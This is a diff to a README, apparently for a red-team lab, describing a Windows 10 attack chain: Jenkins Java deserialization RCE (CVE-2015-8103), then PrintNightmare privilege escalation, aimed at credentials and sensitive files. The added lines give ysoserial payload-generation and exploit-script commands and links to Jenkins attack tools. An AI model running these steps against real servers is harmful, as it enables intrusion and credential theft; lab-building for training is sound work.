@@ -4,7 +4,7 @@
 
 # Info
 - Target             : Windows 10
-- Initial Compromise : Jenkins Script Console RCE
+- Initial Compromise : Java Deserialization in Jenkins <= 1.638 (CVE-2015-8103)
 - Priv Esc           : Printer Nightmare (CVE-2021-34527)
 - Purpose            : Obtain local/domain credentials + other sensitive files
 
@@ -22,8 +22,16 @@
 - Now Jenkins should be running on port 8080
 
 ## Running the Exploit
-- Run `python exploit.py <IP> <PORT> <PATH>` where IP and PORT represent the target Jenkins server and PATH is a local path to a groovy file to execute on the target
-    - Remember to change the IP and filename in the Groovy code
+- Generate serialized java payload: https://github.com/frohoff/ysoserial
+    - `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar`
+    - Example payload that executes the calcualtor app on the target:
+    - `java -jar ysoserial-all.jar CommonsCollections7 calc.exe > payload`
+- Python exploit script:
+    - https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py
+- Run `python exploit.py [IP] [PORT] /path/to/payload`
+    - Might need to run a few times to get the RCE to work
+- Other Jenkins vulns here:
+    - https://github.com/gquere/pwn_jenkins
 
 ## TODO
 - Obfuscation
